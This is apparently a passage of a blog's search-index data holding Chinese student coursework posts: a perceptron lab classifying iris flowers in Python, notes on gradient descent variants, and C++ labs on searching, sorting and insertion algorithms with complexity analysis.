随机梯度下降法随机梯度下降法不同于批量梯度下降，随机梯度下降是在每次迭代时使用一个样本来对参数进行更新（mini-batch size =1）。 小批量梯度下降法什么是小批量梯度下降？具体的说：在算法的每一步，我们从具有 个样本的训练集（已经打乱样本的顺序）中随机抽出一小批量(mini-batch)样本 。小批量的数目 通常是一个相对较小的数（从1到几百）。重要的是，当训练集大小 增长时，通常是固定的。我们可能在拟合几十亿的样本时，每次更新计算只用到几百个样本。 参考文献： [1] 越来越胖的GuanRunwei.简述Sigmoid函数（附Python代码）[G/OL].CSDN,2019(2019-11-25).https://blog.csdn.net/qq_38890412/article/details/103246057 [2] 付修磊.Numpy中的shape函数的用法详解[G/OL].CSDN,2018(2018-01-17).https://blog.csdn.net/qq_38669138/article/details/79084275 [3] Animesh Johri.x.shape[0] vs x[0].shape in NumPy[G/OL].stackoverflow,2018(2018-9-22).https://stackoverflow.com/questions/48134598/x-shape0-vs-x0-shape-in-numpy [4] RUNOOB.COM编者.NumPy 切片和索引[G/OL].RUNOOB.COM,2021..https://www.runoob.com/numpy/numpy-indexing-and-slicing.html [5] G-kdom.批量梯度下降(BGD)、随机梯度下降(SGD)、小批量梯度下降(MBGD)[G/OL].知乎,2019(2019-7-12).https://zhuanlan.zhihu.com/p/72929546","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"计算智能","slug":"计算智能","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD/"}]},{"title":"计算智能课程设计(基于感知机的鸢尾花分类)","date":"2021-11-29T10:05:03.000Z","path":"2021/11/29/计算智能课程设计-基于感知机的鸢尾花分类/","text":"写在前面岁月匆匆，不知不觉已经步入了大三学年。专业课的学习也变得更加深入，今天要做的是计算智能的课程设计，基于感知机的鸢尾花分类。2021.11.29. 基于感知机的鸢尾花分类实验目的利用感知机算法对鸢尾花种类进行分类，要求熟悉感知机算法，掌握利用Python实现机器学习算法的一般流程，了解scikit-learn机器学习库的使用。 背景知识植物的分类与识别是植物学研究和农林业生产经营中的重要基础工作,对于区分植物种类、探索植物间的亲缘关系、阐明植物系统的进化规律具有重要意义。传统识别植物的方法主要依靠人工，需要丰富的专业知识，工作量大，效率不高，而且难以保证分类的客观性和精确性。随着信息技术飞速发展，将计算机视觉、模式识别、数据库等技术应用于植物种类识别，使得识别更加简单、准确、易行。相对于植物的其它部分，其花朵图像更容易获取，花朵的颜色和形状等都可作为分类依据。本案例在提取花朵形态特征的基础上,利用感知机算法进行分类与识别。鸢（读音同”愿”）尾花，英文为 Iris，多年生草本植物，花大而美丽，叶片青翠碧绿，观赏价值很高，是一种重要的观赏用庭园植物。 其外形作为独特的徽章，在欧洲的宗教、皇室建筑上被广泛应用。特别是在法国，印在法国军旗上的三朵鸢尾花图案标志着法兰西王国的王权。鸢尾花有三个主要类型(种属): Setosa 山鸢尾、 Versicolour 变色鸢尾 和 Virginica 维吉尼亚鸢尾，其主要区别是萼片长度、萼片宽度、花瓣长度和花瓣宽度。 鸢尾花数据集：scikit-learn 是基于 Python 的机器学习库，其默认安装包含了几个小型的数据集，并提供了读取这些数据集的接口。 其中 sklearn.datasets.load_iris()用于读取鸢尾花数据集，该数据集有 150 组 3 种类型鸢尾花的 4 种属性:萼片长度 sepal length、萼片宽度 sepal width、花瓣长度 petallength 和花瓣宽度 petal width，样本编号与类型的关系是：样本编号 0 至 49 为 Setosa ,50 至 99 为Versicolour ,100 至 149 为 Virginica。 示例代码1 ） 加载用到的库 123import numpy as npimport matplotlib.pyplot as pltfrom sklearn.datasets import load_iris #仅用于加载数据集 2 ）加载鸢尾花数据集 1iris &#x3D; load_iris() 如前所述，scikit-learn 提供了读取鸢尾花数据集的接口 sklearn.datasets.load_iris()，该数据集有 150 组 3 种类型鸢尾花的 4 种属性:萼片长度 sepal length、萼片宽度 sepal width、花瓣长度 petal length 和花瓣宽度 petal width，样本编号与类型的关系是：样本编号 0 至 49 为 Setosa ,50 至 99 为Versicolour ,100 至 149 为 Virginica。代码 iris = load_iris()中得到的 iris 是一个字典，包含七个“key-value”对： 其中每一个 key 的意义和 value 说明如下： 3）通过画图了解三种鸢尾花的分布 1234567891011121314plt.clf()plt.xlim(0, 7)#x 轴上的最小值和最大值plt.ylim(0, 4)plt.title(u&#x27;iris 数据集 萼片&#x27;, fontsize=15)X=iris.data[:,0:2]plt.xlabel(&#x27;petal length 萼片长度&#x27;, fontsize=13)plt.ylabel(&#x27;petal width 萼片宽度&#x27;, fontsize=13)plt.plot(X[:50, 0], X[:50, 1], &#x27;bo&#x27;, color=&#x27;blue&#x27;, label=&#x27;Setosa 山鸢尾&#x27;)plt.plot(X[50:100, 0], X[50:100, 1], &#x27;bo&#x27;, color=&#x27;orange&#x27;, label=&#x27;Versicolour 变色鸢尾&#x27;)plt.plot(X[100:150, 0], X[100:150, 1], &#x27;bo&#x27;, color=&#x27;red&#x27;, label=&#x27;Virginica 维吉尼亚鸢尾&#x27;)plt.legend()plt.show() 生成图片如下： 从图中大致可以看出，萼片长度和萼片宽度与鸢尾花类型间呈现出非线性关系。 从图中大致可以看出，花瓣长度和花瓣宽度与鸢尾花类型间有较好的线性关系，使用花瓣数据来划分鸢尾花类型效果更好。 4 ）算法初始化 12345678910111213141516171819X=np.c_[np.ones(100),iris.data[:100,2:4]]# 得到真值T，从数据集中得到真值T=iris.target[:100].reshape(100,1)# 将T中所有不等于1的元素赋值为-1，以契合sign函数T[T!=1] = -1# 权值初始化，3行1列，即w0 w1 w2 # 直接赋初值，不使用随机数W = np.array([[1], [1], [1]])# 学习率设置lr = 1# 神经网络输出Y = 0 np.ones(100) 生成 100 行 1 列的 1，作为偏置的输入。iris.data[:100,2:4] 得到前 100 行,2 列和 3 列数据，作为两个特征(花瓣长度、花瓣宽度)的输入。np.c_是按行连接两个矩阵，就是把两矩阵左右相连形成一个新矩阵，要求行数相等。组合两个特征和偏置，形成最终的输入 X。X=(x0 x1 x2)，即偏置、花瓣长度、花瓣宽度。真值 T 直接从数据集中得到，然后将 T 中所有不等于 1 的元素赋值为-1，以契合接下来将要使用到的 sign 函数。 5 ）学习算法 1234567891011121314151617181920212223# # 学习算法#训练感知机模型# 更新一次权值def train(): # 使用全局变量W global W # 同时计算100个数据的预测值 # Y的形状为(100,1)-100行1列 Y = np.sign(np.dot(X,W)) # T - Y得到100个的标签值与预测值的误差E。形状为(100,1) E = T - Y # X的形状为(100,3) # X.T表示X的转置矩阵，形状为(3,100) # 我们一共有100个数据，每个数据3个特征的值。定义第i个数据的第j个特征值为xij # 如第1个数据，第2个值为x12 # X.T.dot(E)为一个3行1列的数据： # 第1行等于：x0_0×e0+x1_0×e1+x2_0×e2+x3_0×e3+...+x99_0×e99，它会调整权值W0 # 第2行等于：x0_1×e0+x1_1×e1+x2_1×e2+x3_1×e3+...+x99_1×e99，它会调整权值W1 # 第3行等于：x0_2×e0+x1_2×e1+x2_2×e2+x3_2×e3+...+x99_2×e99，它会调整权值W2 # X.shape表示X的形状X.shape[0]得到X的行数，表示有多少个数据 # X.shape[1]得到列数，表示每个数据有多少个特征值。 delta_W = lr * (X.T.dot(E)) / X.shape[0] W = W + delta_W 6）画图函数 12345678910111213141516171819202122232425262728293031323334353637# # 画图函数def draw(): plt.clf() plt.xlim(0, 6)#x轴上的最小值和最大值 plt.ylim(0, 2)#y轴上的最小值和最大值 plt.title(u&#x27;Perceptron感知器 epoch:%d\\n W0:%f W1:%f W2:%f&#x27; %(i+1,W[0],W[1],W[2]), fontsize=15) plt.xlabel(&#x27;petal length 花瓣长度&#x27;, fontsize=13) plt.ylabel(&#x27;petal width 花瓣宽度&#x27;, fontsize=13) plt.plot(X[:50, 1], X[:50, 2], &#x27;bo&#x27;, color=&#x27;red&#x27;, label=&#x27;Setosa山鸢尾&#x27;) # 用黄色的点来画出负样本 plt.plot(X[50:100, 1], X[50:100, 2], &#x27;bo&#x27;, color=&#x27;blue&#x27;, label=&#x27;Versicolour变色鸢尾&#x27;) plt.plot(2.5, 1, &#x27;b+&#x27;, color=&#x27;black&#x27;, label=&#x27;待预测点&#x27;) k = - W[1] / W[2] d = -W[0] / W[2] # 设定两个点 xdata = (0,6) # 通过两个点来确定一条直线，用红色的线来画出分界线 plt.plot(xdata,xdata * k + d,&#x27;black&#x27;, linewidth=3) plt.legend() ######################################################以下绘制决策面两边的颜色，不要求掌握 # 生成决策面 from matplotlib.colors import ListedColormap #绘制决策面两边的颜色，不要求掌握 # 生成x,y的数据 n = 256 xx = np.linspace(0, 6, n) yy = np.linspace(0, 2, n) # 把x,y数据生成mesh网格状的数据，因为等高线的显示是在网格的基础上添加上高度值 XX, YY = np.meshgrid(xx, yy) # 填充等高线 colors = (&#x27;red&#x27;, &#x27;blue&#x27;, &#x27;lightgreen&#x27;, &#x27;gray&#x27;, &#x27;cyan&#x27;) cmap = ListedColormap(colors[:len(np.unique(np.sign(W[0]+W[1]*XX+W[2]*YY)))]) plt.contourf(XX, YY, np.sign(W[0]+W[1]*XX+W[2]*YY),8, alpha = 0.5, cmap=cmap) #######################################################以上绘制决策面两边的颜色，不要求掌握 plt.pause(0.1) plt.show() 7）主函数 12345678910111213# # 训练100次for i in range(1000): if(i==0): #特地画出未经训练的初始图像，以方便理解 draw() plt.pause(5) #停留两秒，这是分类直线最初的位置，取决于W的初始值，是人为决定的超参数 train() #更新一次权值 draw() #画出更新一次权值后的图像 Y = np.sign(np.dot(X,W)) # .all()表示Y中的所有值跟T中所有值都对应相等，结果才为真 if(Y == T).all(): print(&#x27;Finished&#x27;) # 跳出循环 break 实验内容请回答下列问题： 第一题1.考虑学习率的作用。修改示例代码，固定初始权值=(1,1,1)，将学习率分别设定为 1、0.5、0.1（组合 1~3），程序在 epoch 等于多少时实现分类？ 当修改学习率为1时： 当修改学习率为0.5时： 当修改学习率为0.1时： 第二题2.考虑初始权值的作用。修改示例代码，固定学习率=0.1，将初始权值分别设定为(-1,1,1)、(+1,-1,-1)、(1,-1,+1) 、(-1,+1,-1) （组合 4~7），程序在 epoch 等于多少时实现分类？ 当初始权值设定为(-1,1,1)时： 当初始权值设定为(+1,-1,-1)时： 当初始权值设定为(+1,-1,+1) 时： 当初始权值设定为(-1,+1,-1) 时： 跑程序出现的问题出问题的前提是在未联网的情况下，跑了感知机实验。 当初始权值设定为(+1,-1,+1) 时，感知机失效，epoch在176-190之间徘徊。与同学对照，发现绝大多数定格在了322次。 我尝试重启pycharm，多次尝试后均未奏效。 尝试修改程序，先修改学习率跑一次，再把学习率改回来跑，失效。 第三题3.示例程序使用的是离散感知机还是连续感知机？如何判断？ 使用的是离散感知机，因为得到的值不是连续的。 第四题4.为什么在学习算法中要除以 X.shape[0] ？示例程序采用的是批量下降还是逐一下降？是否属于随机下降？是否属于梯度下降？ 由于相加了多次所以要取平均值，保持偏执和其余两项权值大小正常； 属于批量下降 不属于随机下降，不属于梯度下降 X.shape[0]=100 如果不除以X.shape[0]: [[-100.] [-146.2] [-24.6]] 如果除以X.shape[0]: [[-1] [-1.426] [-0.246]] 第五题5.假设你在自然界找到了一朵鸢尾花，并测得它的花瓣长度为 2.5cm，花瓣宽度为 1cm，它属于哪一类？在 draw()中已用 plt.plot 画出这个’待预测点’。请观察 1~7 这 7 种组合中，感知机的判断始终一致么？这说明它受到什么因素的影响？ 属于Versicolour 变色鸢尾。 暂时空着 感知机的判断并不一致，它受到学习率和权值的影响。 第六题6.修改示例代码，将变色鸢尾的数据替换为维吉尼亚鸢尾，再进行分类。即横轴为花瓣长度，纵轴为花瓣宽度，数据为 Setosa 山鸢尾+Virginica 维吉尼亚鸢尾。 更改代码如下： 123456789101112Xb=np.c_[np.ones(50),iris.data[100:150,2:4]]Xa=np.c_[np.ones(50),iris.data[:50,2:4]]X=np.r_[Xa,Xb]# 得到真值T，从数据集中得到真值T1=iris.target[:50]T2=iris.target[100:150]T=np.r_[T1,T2].reshape(100,1)# 将T中等于0的元素都变为-1，等于2的元素都变成1，以契合sign函数T[T==0] = -1T[T==2] = 1; 12345678910111213141516171819plt.clf() plt.xlim(0, 7)#x轴上的最小值和最大值 plt.ylim(0, 6)#y轴上的最小值和最大值 plt.title(u&#x27;Perceptron感知器 epoch:%d\\n W0:%f W1:%f W2:%f&#x27; %(i+1,W[0],W[1],W[2]), fontsize=15) plt.xlabel(&#x27;petal length 花瓣长度&#x27;, fontsize=13) plt.ylabel(&#x27;petal width 花瓣宽度&#x27;, fontsize=13) plt.plot(X[:50, 1], X[:50, 2], &#x27;bo&#x27;, color=&#x27;red&#x27;, label=&#x27;Setosa山鸢尾&#x27;) # 用黄色的点来画出负样本 plt.plot(X[50:100, 1], X[50:100, 2], &#x27;bo&#x27;, color=&#x27;blue&#x27;, label=&#x27;Virginica维吉尼亚鸢尾&#x27;) plt.plot(2.5, 1, &#x27;b+&#x27;, color=&#x27;black&#x27;, label=&#x27;待预测点&#x27;) k = - W[1] / W[2] d = -W[0] / W[2] # 设定两个点 xdata = (0,6) # 通过两个点来确定一条直线，用红色的线来画出分界线 plt.plot(xdata,xdata * k + d,&#x27;black&#x27;, linewidth=3) plt.legend() 效果： 第七题7.【可选】目前感知机只有两个输入+偏置，如果有三个输入（比如增加萼片长度作为输入），程序应如何修改（可以不画图）？ 123456789101112# 从图中大致可以看出，花瓣长度和花瓣宽度与鸢尾花类型间有较好的线性关系，使用花瓣数据来划分鸢尾花类型效果更好。Xb=np.c_[np.ones(50),iris.data[100:150,2:4],iris.data[100:150,0:1]]Xa=np.c_[np.ones(50),iris.data[:50,2:4],iris.data[100:150,0:1]]X=np.r_[Xa,Xb]# 得到真值T，从数据集中得到真值T1=iris.target[:50]T2=iris.target[100:150]T=np.r_[T1,T2].reshape(100,1)# 将T中所有不等于1的元素赋值为-1，以契合sign函数T[T==0] = -1T[T==2] = 1; 1234567891011# 权值初始化，4行1列，即w0 w1 w2 w3 # 直接赋初值，不使用随机数W = np.array([[+1], [-1], [+1], [+1]])# 学习率设置lr = 0.1# 神经网络输出Y = 0 完整实验代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162# 加载用到的库import numpy as npimport matplotlib.pyplot as pltfrom sklearn.datasets import load_iris #仅用于加载数据集# 画图时的中文支持plt.rcParams[&#x27;font.sans-serif&#x27;] = [&#x27;SimHei&#x27;] # 用来正常显示中文标签plt.rcParams[&#x27;axes.unicode_minus&#x27;] = False # 用来正常显示负号#加载数据集iris = load_iris()# # 鸢尾花数据集# scikit-learn是基于Python的机器学习库，其默认安装包含了几个小型的数据集，并提供了读取这些数据集的接口。# 其中sklearn.datasets.load_iris()用于读取鸢尾花数据集，该数据集有150组3种类型鸢尾花的4种属性:萼片长度sepal length、萼片宽度sepal width、花瓣长度petal length和花瓣宽度petal width，样本编号与类型的关系是：样本编号0至49为 Setosa ,50至99为 Versicolour ,100至149为 Virginica。# 通过画图了解三种鸢尾花的分布plt.clf()plt.xlim(0, 7)#x轴上的最小值和最大值plt.ylim(0, 4)plt.title(u&#x27;iris数据集 萼片&#x27;, fontsize=15)X=iris.data[:,0:2]plt.xlabel(&#x27;petal length 萼片长度&#x27;, fontsize=13)plt.ylabel(&#x27;petal width 萼片宽度&#x27;, fontsize=13)plt.plot(X[:50, 0], X[:50, 1], &#x27;bo&#x27;, color=&#x27;blue&#x27;, label=&#x27;Setosa山鸢尾&#x27;)plt.plot(X[50:100, 0], X[50:100, 1], &#x27;bo&#x27;, color=&#x27;orange&#x27;, label=&#x27;Versicolour变色鸢尾&#x27;)plt.plot(X[100:150, 0], X[100:150, 1], &#x27;bo&#x27;, color=&#x27;red&#x27;, label=&#x27;Virginica维吉尼亚鸢尾&#x27;)plt.legend()plt.show()plt.pause(3) # 从图中大致可以看出，萼片长度和萼片宽度与鸢尾花类型间呈现出非线性关系。plt.clf()plt.xlim(0, 7)#x轴上的最小值和最大值plt.ylim(0, 3)plt.title(u&#x27;iris数据集 花瓣&#x27;, fontsize=15)X=iris.data[:,2:4]plt.xlabel(&#x27;petal length 花瓣长度&#x27;, fontsize=13)plt.ylabel(&#x27;petal width 花瓣宽度&#x27;, fontsize=13)plt.plot(X[:50, 0], X[:50, 1], &#x27;bo&#x27;, color=&#x27;blue&#x27;, label=&#x27;Setosa山鸢尾&#x27;)plt.plot(X[50:100, 0], X[50:100, 1], &#x27;bo&#x27;, color=&#x27;orange&#x27;, label=&#x27;Versicolour变色鸢尾&#x27;)plt.plot(X[100:150, 0], X[100:150, 1], &#x27;bo&#x27;, color=&#x27;red&#x27;, label=&#x27;Virginica维吉尼亚鸢尾&#x27;)plt.legend()plt.show()plt.pause(3) # 从图中大致可以看出，花瓣长度和花瓣宽度与鸢尾花类型间有较好的线性关系，使用花瓣数据来划分鸢尾花类型效果更好。X=np.c_[np.ones(100),iris.data[:100,2:4]]# 得到真值T，从数据集中得到真值T=iris.target[:100].reshape(100,1)# 将T中所有不等于1的元素赋值为-1，以契合sign函数T[T!=1] = -1# 权值初始化，3行1列，即w0 w1 w2 # 直接赋初值，不使用随机数W = np.array([[1], [1], [1]])# 学习率设置lr = 1# 神经网络输出Y = 0# # 学习算法#训练感知机模型# 更新一次权值def train(): # 使用全局变量W global W # 同时计算100个数据的预测值 # Y的形状为(100,1)-100行1列 Y = np.sign(np.dot(X,W)) # T - Y得到100个的标签值与预测值的误差E。形状为(100,1) E = T - Y # X的形状为(100,3) # X.T表示X的转置矩阵，形状为(3,100) # 我们一共有100个数据，每个数据3个特征的值。定义第i个数据的第j个特征值为xij # 如第1个数据，第2个值为x12 # X.T.dot(E)为一个3行1列的数据： # 第1行等于：x0_0×e0+x1_0×e1+x2_0×e2+x3_0×e3+...+x99_0×e99，它会调整权值W0 # 第2行等于：x0_1×e0+x1_1×e1+x2_1×e2+x3_1×e3+...+x99_1×e99，它会调整权值W1 # 第3行等于：x0_2×e0+x1_2×e1+x2_2×e2+x3_2×e3+...+x99_2×e99，它会调整权值W2 # X.shape表示X的形状X.shape[0]得到X的行数，表示有多少个数据 # X.shape[1]得到列数，表示每个数据有多少个特征值。 delta_W = lr * (X.T.dot(E)) / X.shape[0] W = W + delta_W# # 画图函数def draw(): plt.clf() plt.xlim(0, 6)#x轴上的最小值和最大值 plt.ylim(0, 2)#y轴上的最小值和最大值 plt.title(u&#x27;Perceptron感知器 epoch:%d\\n W0:%f W1:%f W2:%f&#x27; %(i+1,W[0],W[1],W[2]), fontsize=15) plt.xlabel(&#x27;petal length 花瓣长度&#x27;, fontsize=13) plt.ylabel(&#x27;petal width 花瓣宽度&#x27;, fontsize=13) plt.plot(X[:50, 1], X[:50, 2], &#x27;bo&#x27;, color=&#x27;red&#x27;, label=&#x27;Setosa山鸢尾&#x27;) # 用黄色的点来画出负样本 plt.plot(X[50:100, 1], X[50:100, 2], &#x27;bo&#x27;, color=&#x27;blue&#x27;, label=&#x27;Versicolour变色鸢尾&#x27;) plt.plot(2.5, 1, &#x27;b+&#x27;, color=&#x27;black&#x27;, label=&#x27;待预测点&#x27;) k = - W[1] / W[2] d = -W[0] / W[2] # 设定两个点 xdata = (0,6) # 通过两个点来确定一条直线，用红色的线来画出分界线 plt.plot(xdata,xdata * k + d,&#x27;black&#x27;, linewidth=3) plt.legend() ######################################################以下绘制决策面两边的颜色，不要求掌握 # 生成决策面 from matplotlib.colors import ListedColormap #绘制决策面两边的颜色，不要求掌握 # 生成x,y的数据 n = 256 xx = np.linspace(0, 6, n) yy = np.linspace(0, 2, n) # 把x,y数据生成mesh网格状的数据，因为等高线的显示是在网格的基础上添加上高度值 XX, YY = np.meshgrid(xx, yy) # 填充等高线 colors = (&#x27;red&#x27;, &#x27;blue&#x27;, &#x27;lightgreen&#x27;, &#x27;gray&#x27;, &#x27;cyan&#x27;) cmap = ListedColormap(colors[:len(np.unique(np.sign(W[0]+W[1]*XX+W[2]*YY)))]) plt.contourf(XX, YY, np.sign(W[0]+W[1]*XX+W[2]*YY),8, alpha = 0.5, cmap=cmap) #######################################################以上绘制决策面两边的颜色，不要求掌握 plt.pause(0.1) plt.show()# # 训练1000次for i in range(1000): if(i==0): #特地画出未经训练的初始图像，以方便理解 draw() plt.pause(5) #停留两秒，这是分类直线最初的位置，取决于W的初始值，是人为决定的超参数 train() #更新一次权值 draw() #画出更新一次权值后的图像 Y = np.sign(np.dot(X,W)) # .all()表示Y中的所有值跟T中所有值都对应相等，结果才为真 if(Y == T).all(): print(&#x27;Finished&#x27;) # 跳出循环 break","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"计算智能","slug":"计算智能","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD/"}]},{"title":"算法设计与分析(算法分析技术)","date":"2021-11-23T08:58:16.000Z","path":"2021/11/23/算法设计与分析-算法分析技术/","text":"实验1算法分析技术寻找最大元素和最小元素【问题描述】 使用一种程序设计语言分别写出一种从一个数组中寻找最大元素和最小元素的算法，并分析其时间复杂性。 【算法设计思路】 从数组的第一项起遍历整个数组，与数组的每一项元素进行比较进行交换，最终返回最大（最小）元素的索引。因只遍历了一遍数组，所以时间复杂度为O(n)。 【算法描述】 1234567891011121314151617int algorithm_max(int a[],int n)&#123; int temp=0; for(int i=0; i&lt;n; i++) if(a[temp]&lt;a[i]) temp = i; return temp;&#125;int algorithm_min(int a[],int n)&#123; int temp=0; for(int i=0; i&lt;n; i++) if(a[temp]&gt;a[i]) temp = i; return temp;&#125; 【复杂性分析】 时间复杂度为O(n). 【实验结果】 附全部代码和实验运行结果截图： 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;int algorithm_max(int a[],int n)&#123; int temp=0; for(int i=0; i&lt;n; i++) if(a[temp]&lt;a[i]) temp = i; return temp;&#125;int algorithm_min(int a[],int n)&#123; int temp=0; for(int i=0; i&lt;n; i++) if(a[temp]&gt;a[i]) temp = i; return temp;&#125;int main()&#123; int n; cin&gt;&gt;n; int *a = new int[n](); for (int i=0; i&lt;n ; i++ ) cin&gt;&gt;a[i]; int max_n = algorithm_max(a,n); int min_n = algorithm_min(a,n); cout&lt;&lt;&quot;数组中最大的元素为：&quot;&lt;&lt;a[max_n]&lt;&lt;endl; cout&lt;&lt;&quot;数组中最小的元素为：&quot;&lt;&lt;a[min_n]&lt;&lt;endl; delete []a;&#125; 运行结果如下： 排序算法【问题描述】 使用一种程序设计语言写出选择排序算法的程序，并分析其时间复杂性。 【算法设计思路】 这里实现简单选择排序算法。首先开辟长度为n的动态数组，然后在要排序的一组数中，选出最小的一个数与第一个位置的数交换；然后在剩下的数当中再找最小的与第二个位置的数交换，如此循环到倒数第二个数和最后一个数比较为止。最终数组中序列变为有序。 【算法描述】 123456789101112131415void selectsort(int a[],int n)&#123; for (int i=0; i&lt;n ; i++ ) &#123; int k = i; for (int j=i; j&lt;n ; j++ ) &#123; if(a[j]&lt;a[k]) k=j; &#125; int temp = a[i]; a[i] = a[k]; a[k] = temp; &#125;&#125; 【复杂性分析】 时间复杂度为O(n^2). 【实验结果】 附全部代码和实验运行结果截图： 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;using namespace std;void selectsort(int a[],int n)&#123; for (int i=0; i&lt;n ; i++ ) &#123; int k = i; for (int j=i; j&lt;n ; j++ ) &#123; if(a[j]&lt;a[k]) k=j; &#125; int temp = a[i]; a[i] = a[k]; a[k] = temp; &#125;&#125;int main()&#123; int n; cin&gt;&gt;n; int *a = new int[n](); for (int i =0; i&lt;n ; i++ ) cin&gt;&gt;a[i]; selectsort(a,n); for (int i =0; i&lt;n ; i++ ) cout&lt;&lt;a[i]&lt;&lt; &#x27; &#x27;; delete []a;&#125; 运行结果如下： 有序数组插入新元素【问题描述】 使用一种程序设计语言写出一种向一个有序数组中插入一个新元素的算法（需要判断原数组是升序还是降序），并分析其时间复杂性。 【算法设计思路】 首先开辟一个长度为2*n的动态数组（方便插入数据后数组整体向后移动）判断原数组是升序还是降序，如果为升序（降序）则将新插入的元素和数组中的最后一个元素比较大小，如果该元素比末尾元素大（小），则直接将其插入数组的末尾成为末位元素。否则，遍历整个数组，将其与数组中的元素比较大小，确定该新元素的位置，将其后面的所有元素整体向后移动一位，然后将新元素插入数组。如果数组中的元素全部相同，则按降序处理。 【算法描述】 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748void alo_insert(int k,int a[],int &amp;n)&#123; int temp = 0; if(a[0]&lt;a[1]) &#123; cout&lt;&lt;&quot;该数组为升序排列&quot;&lt;&lt;endl; if(k&gt;a[n-1]) &#123; a[n]=k; n++; return; &#125; for (int i=0; i&lt;n; i++) &#123; if(k&lt;a[i]) &#123; temp = i; break; &#125; &#125; for(int i=n-1; i&gt;=temp; i--) a[i+1] = a[i]; a[temp] = k; n++; &#125; else &#123; cout&lt;&lt;&quot;该数组为降序排列&quot;&lt;&lt;endl; if(k&lt;a[n-1]) &#123; a[n]=k; n++; return; &#125; for (int i=0; i&lt;n; i++) &#123; if(k&gt;a[i]) &#123; temp = i; break; &#125; &#125; for(int i=n-1; i&gt;=temp; i--) a[i+1] = a[i]; a[temp] = k; n++; &#125;&#125; 【复杂性分析】 时间复杂度为O(n). 【实验结果】 附全部代码和实验运行结果截图： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;iostream&gt;using namespace std;void alo_insert(int k,int a[],int &amp;n)&#123; int temp = 0; if(a[0]&lt;a[1]) &#123; cout&lt;&lt;&quot;该数组为升序排列&quot;&lt;&lt;endl; if(k&gt;a[n-1]) &#123; a[n]=k; n++; return; &#125; for (int i=0; i&lt;n; i++) &#123; if(k&lt;a[i]) &#123; temp = i; break; &#125; &#125; for(int i=n-1; i&gt;=temp; i--) a[i+1] = a[i]; a[temp] = k; n++; &#125; else &#123; cout&lt;&lt;&quot;该数组为降序排列&quot;&lt;&lt;endl; if(k&lt;a[n-1]) &#123; a[n]=k; n++; return; &#125; for (int i=0; i&lt;n; i++) &#123; if(k&gt;a[i]) &#123; temp = i; break; &#125; &#125; for(int i=n-1; i&gt;=temp; i--) a[i+1] = a[i]; a[temp] = k; n++; &#125; int main()&#123; int n; cin&gt;&gt;n; int *a = new int[2*n](); for (int i =0; i&lt;n ; i++ ) cin&gt;&gt;a[i]; int new_n; cout&lt;&lt;&quot;请输入要插入的元素：&quot;&lt;&lt;endl; cin&gt;&gt;new_n;//输入要插入的元素 alo_insert(new_n,a,n); for (int i =0; i&lt;n ; i++ ) cout&lt;&lt;a[i]&lt;&lt; &#x27; &#x27;; delete []a;&#125; 运行结果如下： 插入排序【问题描述】 使用一种程序设计语言写出插入排序算法的程序，并分析其时间复杂性。 【算法设计思路】 将待排序序列分成两个序列，前面的序列保持有序，依次选取后面的序列的元素，在前面的序列中进行插入。初始时，有序序列的长度为1。 【算法描述】 12345678910111213void alo_insertSort(int a[],int n)&#123; for (int i=2; i&lt;n; i++) &#123; int temp = a[i],j =i; while(j&gt;0&amp;&amp;temp&lt;a[j-1]) &#123; a[j]=a[j-1]; j--; &#125; a[j] = temp; &#125;&#125; 【复杂性分析】 最好的情况，时间复杂度为O(n)。最坏的情况，时间复杂度是O（n^2）。平均复杂度也是O（n^2）。 【实验结果】 附全部代码和实验运行结果截图： 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;void alo_insertSort(int a[],int n)&#123; for (int i=2; i&lt;n; i++) &#123; int temp = a[i],j =i; while(j&gt;0&amp;&amp;temp&lt;a[j-1]) &#123; a[j]=a[j-1]; j--; &#125; a[j] = temp; &#125;&#125;int main()&#123; int n; cin&gt;&gt;n; int *a = new int[n](); for (int i =0; i&lt;n ; i++ ) cin&gt;&gt;a[i]; alo_insertSort(a,n); for (int i =0; i&lt;n ; i++ ) cout&lt;&lt;a[i]&lt;&lt; &#x27; &#x27;; delete []a;&#125; 运行结果如下： 不重复的插入算法【问题描述】 使用一种程序设计语言写出一种不重复的插入算法，该算法用于向一个不含重复元素的升序数组中不重复地插入一个新元素。 【算法设计思路】 与第三题思路基本相同，本题不需要考虑出现重复元素的情况，并且已经规定为升序序列，将新插入的元素和数组中的最后一个元素比较大小，如果该元素比末尾元素大（小），则直接将其插入数组的末尾成为末位元素。否则，遍历整个数组，将其与数组中的元素比较大小，确定该新元素的位置，将其后面的所有元素整体向后移动一位，然后将新元素插入数组。 【算法描述】 1234567891011121314151617181920212223242526void alo_insert(int k,int a[],int &amp;n)&#123; int temp = 0; if(a[0]&lt;a[1]) &#123; if(k&gt;a[n-1]) &#123; a[n]=k; n++; return; &#125; for (int i=0; i&lt;n; i++) &#123; if(k&lt;a[i]) &#123; temp = i; break; &#125; &#125; for(int i=n-1; i&gt;=temp; i--) a[i+1] = a[i]; a[temp] = k; n++; &#125;&#125; 【复杂性分析】 